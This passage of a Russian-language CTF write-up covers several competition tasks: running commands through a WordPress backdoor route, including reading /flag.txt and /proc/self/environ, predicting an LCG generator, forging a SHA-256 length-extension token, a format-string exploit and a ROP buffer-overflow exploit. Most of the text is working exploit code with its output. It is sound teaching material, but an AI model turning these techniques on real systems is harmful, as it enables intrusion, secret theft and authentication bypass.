/wp-json/wp2shell/v1/f8b000a326e88105cb84a05c
```

Название `wp2shell` - это уже не намёк, а прямой текст: похоже на бэкдор для выполнения команд.

### Протокол бэкдора

Роут ожидал JSON с командой в Base64 в поле `c`:

```json
{"c":"BASE64_COMMAND_HERE"}
```

Обернула это в маленький shell-хелпер:

```bash
BASE='https://task2.cyberolympiad.kz'
ROUTE='/wp-json/wp2shell/v1/f8b000a326e88105cb84a05c'

run_cmd() {
  cmd="$1"
  b64="$(printf '%s' "$cmd" | base64 -w0)"
  curl -sk -X POST "$BASE$ROUTE" \
    -H 'Content-Type: application/json' \
    -d "{\"c\":\"$b64\"}"
}
```

По строкам:

| Строка | Объяснение |
|---|---|
| `cmd="$1"` | берёт команду, переданную в функцию |
| `printf '%s' "$cmd"` | печатает её ровно как есть, без завершающего перевода строки, чтобы не сломать кодирование |
| `base64 -w0` | кодирует в Base64 одной строкой без переносов (`-w0` отключает стандартный перенос строк) |
| `curl -X POST` | отправляет как POST-запрос |
| `-H 'Content-Type: application/json'` | говорит серверу "это тело - JSON", чтобы он его правильно распарсил |
| `-d ...` | само тело запроса |

Подтвердила RCE (выполнение кода) самой простой проверкой:

```bash
run_cmd 'id'
```

Дальше сразу за флагом:

```bash
run_cmd 'cat /flag.txt'
```

Флаг:

```text
ico{7519ee9f05a6a11ca96cc044c971b6ae}
```

### Дополнительный environment-флаг

Пока была внутри, покопалась в файлах WordPress:

```bash
run_cmd 'find /var/www/html -maxdepth 4 -type f -name "*.php" 2>/dev/null | grep -Ei "mu-plugins|flag|shell|plugin"'
```

Нашёлся интересный файл:

```text
wp-content/mu-plugins/flag-plugin.php
```

Проверила переменные окружения процесса:

```bash
run_cmd "tr '\0' '\n' < /proc/self/environ | grep -E 'FLAG|USER_FLAG|ico'"
```

`/proc/self/environ` - специальный файл Linux со всеми переменными окружения текущего процесса, но записи там разделены нулевыми байтами (`\0`), а не переводами строк, так что без `tr '\0' '\n'` всё вывелось бы одним нечитаемым куском.

Дополнительный флаг:

```text
ico{258da6df9fcf12cf110d42dd77d7937f}
```

---

## 7. PixelMart

### Условие

![Task Description](/ico_qualifying_round/tasks/pixelmart.webp)

```text
The online store "PixelMart" gives out bonus codes using its own random generator and prides itself on its integrity.
Join us and see if it's really that hard to predict.
nc 94.131.84.228 33007
```

Задача на предсказание PRNG: подключаешься, сервис выдаёт несколько своих "случайных" значений, и нужно предсказать следующие - тем самым доказав, что генератор никакой не случайный.

### Данные

```text
m = 4294967296
hidden_bits = 16
x0 = 3398650787
x1 = 3458068990
x2_top = 54800
x3 = 27663828
rounds = 20
```

`m = 4294967296 = 2^32` - сразу выдаёт, что это 32-битный LCG (Linear Congruential Generator).

Формула LCG, как уже писала в словаре:

```text
x[n+1] = (a * x[n] + c) mod m
```

У меня были полностью `x0`, `x1` и `x3`, но только *верхние* 16 бит `x2` - нижние 16 бит скрыты. Это всего `65536` вариантов, для компьютера вообще не проблема перебрать.

### Математика (почему это вообще решаемо)

LCG обычно выглядит непредсказуемым *только если не знаешь `a` и `c`*. Но вот в чём фокус: имея три последовательных значения, можно вычислить оба.

Раз `x[n+1] = a*x[n] + c (mod m)` верно на каждом шаге, распишем для двух пар подряд и вычтем - `c` полностью сократится:

```text
x2 - x1 ≡ a * (x1 - x0)   (mod m)
```

Отсюда:

```text
a ≡ (x2 - x1) * inverse(x1 - x0)   (mod m)
```

`inverse(...)` здесь - это *модулярный* обратный элемент: число, которое при умножении на `(x1 - x0)` и взятии по модулю `m` даёт ровно `1`. По сути аналог деления в модулярной арифметике. Как только известно `a`, `c` сразу получается из исходной формулы: `c = x1 - a*x0 (mod m)`.

Загвоздка одна: настоящий `x2` неизвестен полностью, только верхние 16 бит. Поэтому план - перебрать все `65536` вариантов нижних бит, для каждого варианта вычислить `a` и `c`, и проверить, предсказывают ли они правильно уже известный `x3`. Пройдёт проверку только правильный вариант.

### Solver

```python
m = 2**32
hidden_bits = 16

x0 = 3398650787
x1 = 3458068990
x2_top = 54800
x3 = 27663828


def next_value(x, a, c):
    return (a * x + c) % m


for lower in range(1 << hidden_bits):
    x2 = (x2_top << hidden_bits) | lower

    try:
        a = ((x2 - x1) * pow(x1 - x0, -1, m)) % m
    except ValueError:
        continue

    c = (x1 - a * x0) % m

    if next_value(x2, a, c) == x3:
        print("lower =", lower)
        print("x2 =", x2)
        print("a =", a)
        print("c =", c)
        break
```

Пара строк отдельно:

| Строка | Значение |
|---|---|
| `x2 = (x2_top << hidden_bits) \| lower` | Собирает кандидата на полный `x2`: сдвигает известные верхние биты влево и добавляет через OR текущий вариант нижних 16 бит. |
| `pow(x1 - x0, -1, m)` | Встроенный в Python `pow()` с тремя аргументами считает *модулярный обратный элемент*, если степень равна `-1` (эта фича появилась в Python 3.8, работает через расширенный алгоритм Евклида). |
| `except ValueError: continue` | Модулярный обратный существует не для всех чисел - только если `gcd(x1-x0, m) == 1`. Если не существует, Python кидает `ValueError`, и я просто пропускаю этот вариант и пробую следующий. |

Вывод:

```text
lower = 32441
x2 = 3591405241
a = 274874657
c = 646369019
```

Дальше, зная `a` и `c`, предсказать следующие 20 значений - просто прогнать формулу вперёд:

```python
m = 2**32
a = 274874657
c = 646369019
x = 27663828

for _ in range(20):
    x = (a * x + c) % m
    print(x)
```

Предсказания:

```text
900430671
3224290090
573546853
3209642496
864047355
246872662
3063474705
774720556
2207042727
2744227714
1401379005
282803288
2529947219
3390675630
3400920425
3950252676
1337505279
4012508122
3210717205
3281178288
```

Отправила эти 20 предсказаний обратно сервису, он выдал флаг.

### Флаг

```text
ICO{f1gur3_1t_0ut_y0urs3lf_th3n_3xpl0it}
```

---

## 8. VIP Club

### Условие

![Task Description](/ico_qualifying_round/tasks/vip_club.webp)

```text
A private club issues guest passes based on a secret known only to them. You've been given a standard guest pass - enter as an admin.
nc 94.131.84.228 33006
```

Сервер выдал:

```text
data0 = 757365723d6775657374266c6576656c3d6261736963
token0 = e5e16bd00e210a057d9a0fc98d92b8b52ffad64c92b4ca3cd6fc15648011594a
```

Сначала декодировала hex, просто чтобы понять, с чем вообще работаю:

```python
data0 = bytes.fromhex("757365723d6775657374266c6576656c3d6261736963")
print(data0)
```

Вывод:

```text
b'user=guest&level=basic'
```

То есть задача простыми словами: превратить `level=basic` в admin-пропуск, ни разу не узнав секретный ключ сервера.

### Уязвимость: SHA-256 length extension

Слабая схема подписи тут была такая:

```text
token = sha256(secret || message)
```

(`||` тут просто значит "байты, склеенные один за другим".)

Проблема конкретно с этой схемой в следующем: SHA-256 (как и большинство классических хеш-функций) построен на конструкции Меркла-Дамгора - он обрабатывает вход блоками фиксированного размера, и его "хеш на данный момент" - это буквально всё его внутреннее состояние в эту секунду. А значит: если я знаю валидный хеш от `secret || message`, и знаю (или могу угадать) точную длину `secret || message`, я могу продолжить хеширование с этого самого состояния и досыпать ещё данных - получив полностью валидный хеш для `secret || message || padding || extra_data`, ни разу не узнав ни единого байта `secret`.

Это называется **атака удлинением (length-extension attack)**, и уязвима к ней именно конструкция вида `secret || message`. Правильный вариант - `HMAC-SHA256(secret, message)`, устроенный иначе (с вложенными вызовами хеша) специально, чтобы не сливать внутреннее состояние таким образом.

### Подделанные данные

Исходное сообщение:

```text
user=guest&level=basic
```

Что хотела дописать в конец:

```text
&level=admin
```

Подделанные данные, которые в итоге приняли:

```text
757365723d6775657374266c6576656c3d6261736963800000000000000000000000000000000000000000000140266c6576656c3d61646d696e
```

И подделанный токен к ним:

```text
a97ae0b7c03ac5a0ec752a0c710e8a71354f2386306b5824210a06cd1903ce20
```

Обрати внимание на длинный блок нулей посередине, заканчивающийся на `0140` - это не случайный мусор, это **glue padding** (склеивающий паддинг), и выглядит он ровно так же, как добавил бы сам SHA-256 перед хешированием: один байт `0x80`, потом нули до границы блока, потом длина исходного сообщения *в битах* восьмибайтовым числом в самом конце. `0140` в конце - это `0x140 = 320` в десятичной системе, а это число бит: `320 / 8 = 40` байт. Значит, исходные захешированные данные (`secret || message`) были 40 байт целиком. Само сообщение - 22 байта (посчитай `user=guest&level=basic` - да, 22 символа), значит секрет был ровно `40 - 22 = 18` байт.

### Скрипт-решала

Для этого и написан [`tasks/sha256_ext.py`](/ico_qualifying_round/tasks/sha256_ext.py) - я написала SHA-256 с нуля именно для того, чтобы можно было залезть и достать его внутреннее 32-байтное состояние посреди хеширования, чего встроенный Python-модуль `hashlib` сделать нарочно не даёт.

Что там внутри, по частям:

| Часть | Что делает |
|---|---|
| `_K` | 64 раундовые константы из спецификации SHA-256. Забавный факт: они не взяты с потолка, а являются дробными частями кубических корней первых 64 простых чисел, зашитыми как фиксированные 32-битные значения. |
| `_rotr(x, n)` | Циклический сдвиг 32-битного значения вправо на `n` бит - один из "перемешивающих" строительных блоков, на которых работает каждый раунд сжимающей функции SHA-256. |
| `_compress(state, block)` | Настоящая сжимающая функция SHA-256: берёт текущее состояние из 8 слов и один 64-байтный блок сообщения, прогоняет полное 64-раундовое перемешивание по спецификации и возвращает новое состояние. Это и есть сердце хеша. |
| `sha256_padding(total_len_bytes)` | Собирает тот самый glue padding: байт `0x80`, потом нули до границы блока, потом общая длина в битах как 8-байтное big-endian число. |
| `state_from_hexdigest(hexdigest)` | Берёт hex-строку вроде `token0` и превращает обратно в настоящее внутреннее представление SHA-256: 8 чисел по 32 бита. |
| `hexdigest_from_state(state)` | Обратная операция - превращает состояние обратно в привычную hex-строку. |
| `extend(known_hexdigest, known_total_len, suffix)` | Сама атака. Загружает переданный хеш как стартовое состояние, вычисляет, какой паддинг добавило бы оригинальное хеширование, и продолжает сжатие с `suffix` (плюс его собственный завершающий паддинг), как будто просто продолжая оригинальный хеш. Возвращает новый валидный хеш и glue padding, нужный, чтобы подделанное сообщение сошлось. |

Вот драйвер, который я прогнала поверх этого модуля - и я реально перепроверила его на настоящих числах выше при подготовке этого райтапа: он в точности воспроизводит подделанные данные и токен:

```python
import sha256_ext as s

data0 = bytes.fromhex("757365723d6775657374266c6576656c3d6261736963")
token0 = "e5e16bd00e210a057d9a0fc98d92b8b52ffad64c92b4ca3cd6fc15648011594a"

for secret_len in range(64):
    total_len = secret_len + len(data0)
    new_token, glue = s.extend(token0, total_len, b"&level=admin")
    forged_data = (data0 + glue + b"&level=admin").hex()
    # тут отправляешь forged_data + new_token сервису.
    # в реальной атаке сервер не подсказывает длину секрета заранее -
    # просто перебираешь варианты, пока сервер не примет один из них.
```

В реальной атаке заранее правильного ответа не видно - перебираешь правдоподобные длины секрета, подделываешь токен под каждую, и уже сам сервер говорит, какую он принял. Из формы паддинга (см. выше) я уже знала, что ответ - `secret_len = 18`, и подтвердила это: именно при таком значении цикл выдаёт подделанные данные и токен, побайтово совпадающие с тем, что показано выше.

### Финальная команда

```bash
printf "S 757365723d6775657374266c6576656c3d6261736963800000000000000000000000000000000000000000000140266c6576656c3d61646d696e a97ae0b7c03ac5a0ec752a0c710e8a71354f2386306b5824210a06cd1903ce20\n" | nc 94.131.84.228 33006
```

Объяснение:

| Часть | Значение |
|---|---|
| `printf` | Отправляет ровно одну строку, с явным `\n` в конце, чтобы точно контролировать, что уходит по сети. |
| `S` | Команда submit, которую ждёт этот конкретный сервис. |
| первый hex | Подделанные данные: исходное сообщение + glue padding + `&level=admin`. |
| второй hex | Подделанный SHA-256 токен, соответствующий этим данным. |
| `\n` | Перевод строки, чтобы сервер обработал строку, а не ждал ещё ввода. |
| `nc ... 33006` | Netcat, подключение прямо к TCP-порту задачи. |

Сервис принял подделанный admin-пропуск и отдал флаг VIP Club.

### Флаг

Если честно - я его так и не записала. Подделанный admin-пропуск приняли, увидела сообщение об успехе, тут же переключилась на следующую задачу, а что забыла скопировать флаг - поняла только сейчас, когда писала этот райтап. Сам эксплойт полностью задокументирован и воспроизводим выше, просто сама строка флага не попала в мои записи. Классика.

---

## 9. Journal Operator

### Условие

![Task Description](/ico_qualifying_round/tasks/journal_operator.webp)

```text
The program keeps a transaction log. Regular users are not allowed to use it - the service itself informs them of this upon login.
nc 94.131.84.228 33102
```

**Файл задания:** `journal_operator.bin`, лежит в [общей папке на Drive](https://drive.google.com/drive/folders/1pKuyT6qqqxKOCK9oq7Dl5VGQzTkIW_ZW) - скачай и сначала сделай `chmod +x`, если хочешь запустить локально, как я ниже.

Это pwn-задача на format string.

Опасный паттерн в C, из-за которого возникает такой баг:

```c
printf(user_input);
```

против безопасного варианта:

```c
printf("%s", user_input);
```

Разница критичная: в опасном варианте всё, что я ввожу, воспринимается как сама форматная строка, а не просто как данные. Значит, мой ввод может содержать спецификаторы вроде `%p` (напечатать указатель), `%x` (напечатать hex), `%s` (напечатать строку) - и `%n`, самый опасный из всех, потому что вместо того, чтобы что-то напечатать, он *записывает* количество уже напечатанных символов по адресу, который я контролирую.

Целевая переменная прямо из бинарника:

```text
is_admin = 0x40407c
```

Цель: записать `1` ровно по этому адресу.

### Поиск offset

Прежде чем куда-то писать, нужно понять, *в какой позиции форматной строки* начинается именно мой ввод - printf читает свои аргументы со стека по порядку, значит "мой ввод" сидит на какой-то конкретной позиции среди всех этих `%p`. Раз у меня был сам бинарник, я просто запустила его локально и проверила напрямую, а не гадала вслепую:

```bash
printf '%p.%p.%p.%p.%p.%p.%p.%p\n' | ./journal_operator.bin
```

Реальный вывод с запуска:

```text
=== ЖУРНАЛ ОПЕРАТОРА ===
Эта запись попадёт прямо в лог. Обычным пользователям сюда нельзя.
is_admin = 0
> Записано в лог: 0x7ffeacc8df20.(nil).(nil).(nil).0x1c.0x70252e70252e7025.0x252e70252e70252e.0x70252e70252e70
```

Позиция 6 - самая интересная: `0x70252e70252e7025`. Если разбить на байты и прочитать как ASCII (little-endian, то есть последний напечатанный байт на самом деле первый в памяти): `25 70 2e 25 70 2e 25 70` → `%p.%p.%p` - это буквально моя же проверочная строка, смотрящая на меня со стека. Вот и подтверждение: позиция 6 - это ровно то место, где начинается мой контролируемый ввод. Отсюда `fmtstr_payload(6, ...)` в эксплойте ниже.

### Эксплойт

```python
from pwn import *

context.arch = "amd64"

HOST = "94.131.84.228"
PORT = 33102
IS_ADMIN = 0x40407c

io = remote(HOST, PORT)
io.recvuntil(b"> ")

payload = fmtstr_payload(6, {IS_ADMIN: 1}, write_size="byte")
print(payload.hex())

io.sendline(payload)
io.interactive()
```

`fmtstr_payload` сам собирает весь эксплойт под format string - подбирает нужную комбинацию `%c`/`%n`-спецификаторов, чтобы записать точное значение байта по точному адресу, вместо того чтобы собирать это руками. `6` - offset на стеке, найденный выше. `{IS_ADMIN: 1}` значит "запиши `1` по адресу `0x40407c`". `write_size="byte"` пишет только один байт - вполне достаточно, раз `is_admin` это просто булево-подобный флаг.

Вывод:

```text
is_admin = 1
Доступ администратора подтверждён. ICO{str1pp3d_but_st1ll_wr1t3abl3}
```

### Флаг

```text
ICO{str1pp3d_but_st1ll_wr1t3abl3}
```

---

## 10. AEZAKMI

### Условие

![Task Description](/ico_qualifying_round/tasks/aezakmi.webp)

```text
An old arcade machine is asking for a name for its high score table.
nc 94.131.84.228 33101
```

**Файл задания:** `aezakmi.bin`, лежит в [общей папке на Drive](https://drive.google.com/drive/folders/1pKuyT6qqqxKOCK9oq7Dl5VGQzTkIW_ZW) - скачай и сделай `chmod +x`, если хочешь запустить локально.

Запускаешь - вылезает баннер:

```text
=== RETRO ARCADE ===
Введите имя для таблицы рекордов:
```

Введёшь обычное имя - программа просто отшутится: "Чит-коды в этой версии не поддерживаются. До встречи!"

Это stack buffer overflow с небольшой ROP-цепочкой (Return-Oriented Programming).

`AEZAKMI` - сама по себе отсылка: классический чит-код "дай мне всё" из GTA. Символично, потому что бинарник сверяет ввод с захардкоженным магическим значением:

```text
0x1337c0de
```

В Linux x86-64 первый аргумент любой функции передаётся в регистре `rdi` (это просто calling convention - договорённость о том, как аргументы передаются на уровне машинного кода). Значит, если скрытая win-функция выглядит примерно так:

```c
void win(long code) {
    if (code == 0x1337c0de) {
        print_flag();
    }
}
```

...то, чтобы победить, нужно заставить программу вызвать:

```text
win(0x1337c0de)
```

А в регистрах это значит попасть в состояние:

```text
rdi = 0x1337c0de
rip = win
```

(`rip` - instruction pointer, то, что процессор выполнит следующим. Контроль над ним - это вся суть ROP-эксплойта.)

### Значения

```text
OFFSET = 0x48
POP_RDI = 0x401306
RET = 0x401307
WIN = 0x40123d
MAGIC = 0x1337c0de
```

Достала их прямо из бинарника через `objdump -d aezakmi.bin`. Момент, который стоит отметить: `POP_RDI` (`0x401306`) и `RET` (`0x401307`) - это буквально соседние байты в бинарнике, `pop rdi` сразу за которым идёт `ret` - то есть на самом деле это один гаджет (`pop rdi; ret`), а не два случайно оказавшихся рядом.

### Эксплойт

```python
from pwn import *

HOST = "94.131.84.228"
PORT = 33101

OFFSET = 0x48
POP_RDI = 0x401306
RET = 0x401307
WIN = 0x40123d
MAGIC = 0x1337c0de

payload = b"A" * OFFSET
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(MAGIC)
payload += p64(WIN)

io = remote(HOST, PORT)
io.recvuntil("Введите имя".encode())
io.sendline(payload)
io.interactive()
```

Payload по слоям:

```text
'A' * 0x48
RET
POP_RDI
0x1337c0de
WIN
```

Что происходит на самом деле:

1. `b"A" * 0x48` - просто заполнитель, мусорные байты, которые доводят переполнение ровно до сохранённого адреса возврата на стеке, не трогая ничего лишнего.
2. Первый адрес, в который "возвращается" функция - это `RET` (`0x401307`, голая инструкция `ret`) - это трюк с выравниванием стека. Сам по себе он ничего не делает, просто снимает со стека следующее значение и прыгает туда, подгоняя указатель стека под 16-байтное выравнивание, которого ждут некоторые внутренности libc перед настоящим вызовом.
3. Это приводит на `POP_RDI` (`0x401306`), который снимает со стека следующее значение прямо в регистр `rdi` - а следующее значение это `MAGIC` (`0x1337c0de`), так что теперь в `rdi` лежит ровно то, что ждёт `win()`.
4. Завершающий `ret` самого `POP_RDI` (напомню - это тот же байт, тот же `0x401307`, тот же гаджет) снимает последнее значение, `WIN`, и прыгает туда.
5. `win()` выполняется с `rdi = 0x1337c0de`, проверка магического числа проходит, и функция печатает флаг.

Вывод:

```text
Верный чит-код! ICO{n0_symb0ls_st1ll_p0pp3d_rd1}
```

### Флаг

```text
ICO{n0_symb0ls_st1ll_p0pp3d_rd1}
```

<p align="center"><a href="#ico-2027-qualifications-ctf-writeups">Наверх</a></p>
